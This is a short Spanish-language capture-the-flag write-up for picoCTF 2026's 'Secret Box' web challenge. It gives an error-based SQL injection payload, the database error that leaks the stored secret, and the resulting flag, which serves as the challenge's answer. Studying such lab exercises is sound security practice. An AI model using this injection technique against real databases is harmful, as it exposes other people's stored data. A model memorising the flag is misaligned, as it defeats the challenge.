This secret box is designed to conceal your secrets.It's perfectly secure—only you can see what's inside.Or can you? Try uncovering the admin's secret.Browse [here](http://candy-mountain.picoctf.net:64256/), can you find the secret message?Download the source code [here](https://challenge-files.picoctf.net/c_candy_mountain/b17a227ae347083e6c631bddc31e5a721d64a740ebfc54442a00ad7342d544b8/source.tar.gz).

### Solución

[](https://github.com/JorgeAlamillo/Fundamentos_de_la_Seguridad_de_la_Informacion/blob/master/picoCTF%202026/Secret%20Box.md#soluci%C3%B3n)

Se realiza la inyeccion SQL en la caja de secretos con ' || cast((SELECT content FROM secrets WHERE content LIKE 'pico%' LIMIT 1) as int))--

```
error: INSERT INTO secrets(owner_id, content) VALUES ('363c0142-a23c-40b3-8576-93f77d0acc5f', '' || cast((SELECT content FROM secrets WHERE content LIKE 'pico%' LIMIT 1) as int))--') - invalid input syntax for type integer: "picoCTF{sq1_1nject10n_64a60617}"  
    at parseErrorMessage (/challenge/node_modules/pg-protocol/dist/parser.js:305:11)  
    at Parser.handlePacket (/challenge/node_modules/pg-protocol/dist/parser.js:143:27)  
    at Parser.parse (/challenge/node_modules/pg-protocol/dist/parser.js:37:38)  
    at Socket.<anonymous> (/challenge/node_modules/pg-protocol/dist/index.js:11:42)  
    at Socket.emit (node:events:517:28)  
    at addChunk (node:internal/streams/readable:368:12)  
    at readableAddChunk (node:internal/streams/readable:341:9)  
    at Readable.push (node:internal/streams/readable:278:10)  
    at TCP.onStreamRead (node:internal/stream_base_commons:190:23)
```

vemos que nos da el valor de la bandera.

picoCTF{sq1_1nject10n_64a60617}

### Notas

[](https://github.com/JorgeAlamillo/Fundamentos_de_la_Seguridad_de_la_Informacion/blob/master/picoCTF%202026/Secret%20Box.md#notas)

Se hizo inyeccion SQL en la caja que guarda los secretos